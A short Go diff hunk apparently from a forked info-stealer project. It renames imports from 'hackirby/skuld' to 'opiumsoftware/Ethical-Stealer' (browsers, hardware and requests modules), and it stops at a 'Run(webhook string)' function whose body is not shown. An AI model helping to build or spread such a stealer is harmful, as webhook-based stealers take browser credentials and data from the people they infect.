@@ -5,10 +5,10 @@ import (
 	"os"
 	"strings"
 
-	"github.com/hackirby/skuld/modules/browsers"
-	"github.com/hackirby/skuld/utils/fileutil"
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/modules/browsers"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/fileutil"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/hardware"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/requests"
 )
 
 func Run(webhook string) {
